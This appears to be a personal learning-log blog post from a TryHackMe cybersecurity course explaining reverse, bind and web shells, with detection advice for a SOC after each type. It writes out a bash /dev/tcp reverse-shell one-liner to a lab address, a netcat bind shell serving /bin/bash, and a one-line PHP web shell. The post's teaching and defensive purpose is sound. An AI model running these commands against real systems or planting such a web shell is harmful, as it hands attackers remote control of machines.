---
title: "Cyber Security 101, Part 16: Shells (Reverse, Bind and Web Shells)"
date: 2026-11-19 21:00:00 +0500
categories: [Daily Log, Cyber Security 101]
tags: [shells, reverse-shell, bind-shell, web-shell, tryhackme]
---

Once an attacker exploits a system, the goal is usually a **shell**: command-line control of the target. This room covered the different kinds of shell, how each one connects, and the payloads and listeners involved. These are among the most important things for a SOC to detect, so the defender's view runs through the whole post.

## What a shell is here

In this context, a **shell** means interactive command-line access to a machine you've compromised. There are two directions the connection can go, and the difference decides how it shows up in network traffic.

## Reverse shell

In a **reverse shell**, the **target connects out** to the attacker. The attacker starts a **listener** on their own machine, then runs code on the target that calls back to it.

```bash
# Attacker: start a listener
nc -lvnp 4444

# Target: connect back (one of many forms)
bash -i >& /dev/tcp/10.8.0.5/4444 0>&1
```

Reverse shells are the common choice because outbound connections usually get through firewalls more easily than inbound ones: most firewalls let internal machines connect out, but block connections coming in.

**Defender's view:** a reverse shell is an **outbound connection from a server to an unusual external address**, often on a round number port like 4444, from a process that has no business making network connections (a web server process suddenly running `bash` and connecting out). That mismatch is a strong detection point.

## Bind shell

In a **bind shell**, the roles are reversed: the **target listens**, and the **attacker connects in**.

```bash
# Target: listen and serve a shell
nc -lvnp 4444 -e /bin/bash

# Attacker: connect to it
nc 10.10.10.5 4444
```

Bind shells are less common now, because a firewall in front of the target usually blocks the incoming connection. They work best when the attacker already has a network path to the target.

**Defender's view:** an unexpected **listening port** on a machine (something new in `netstat` or `Get-NetTCPConnection`) and inbound connections to it.

## Shell listeners

A **listener** is simply something waiting for a connection. **Netcat (nc)** is the classic tool (`nc -lvnp 4444`), but it gives a basic, unstable shell. Metasploit's `multi/handler` is a more capable listener, and **rlwrap** or shell-upgrade tricks are used to make a raw shell more usable (history, tab completion, handling Ctrl+C).

## Shell payloads

A **payload** is the code that actually makes the connection. They come in many languages so one will fit whatever runs on the target:

- **Bash:** `bash -i >& /dev/tcp/IP/PORT 0>&1`
- **Python:** a short script using the `socket` and `subprocess` modules
- **PHP:** `<?php system($_GET['cmd']); ?>` and fuller reverse-shell scripts
- **PowerShell:** a one-liner that opens a TCP client and runs commands
- **Netcat:** where a suitable version is present

Resources like PayloadsAllTheThings collect these. **msfvenom** (from yesterday's post) generates them too. The key point for a defender is that these payloads have recognisable shapes, and many appear in command-line logging and PowerShell script block logs.

## Web shells

A **web shell** is a script uploaded to a web server that lets the attacker run commands through the browser. A minimal PHP one:

```php
<?php system($_GET['cmd']); ?>
```

Placed on the server as `shell.php`, the attacker then visits `http://site/shell.php?cmd=whoami` and the server runs it. Web shells usually get onto a server through a **file upload** flaw (uploading a `.php` file where only images were expected) or through another vulnerability that writes a file.

**Defender's view:** web shells show up as **new or unexpected files** in the web directory, and as **web requests with commands in the query string** (`?cmd=`, `?cmd=whoami`). They're also visible when the web server process spawns command-line processes it normally never would. File integrity monitoring on the web root is a direct defence.

## Why this matters for a SOC engineer

Getting a shell is the moment an attacker turns a vulnerability into real control, so detecting shells is central to the job. The signals are concrete:

- a server process making an **outbound** connection to a strange address (reverse shell)
- an unexpected **listening port** (bind shell)
- a web server process spawning `bash`, `cmd` or `powershell`
- **new script files** appearing in a web directory
- command-line and PowerShell logs showing shell one-liners

Most of these come from **process and command-line logging** and **network connection logs**, which is exactly the SIEM and EDR data I'll be working with. This is where the offensive half of the path connects to the defensive half, which the path moves into next.

## Questions I should be able to answer

- What's the difference between a reverse shell and a bind shell, and which way does each connection go?
- Why are reverse shells more common than bind shells?
- What is a listener, and what tools provide one?
- Why do shell payloads come in so many languages?
- How does a web shell work, and how does one usually get onto a server?
- For each shell type, name a concrete thing a SOC would see.

## Next

That's the offensive tooling section done. From here the path turns to defensive security: SOC fundamentals, SIEM, logs, and incident response, which is where I'm headed. Those posts come next, two a day.
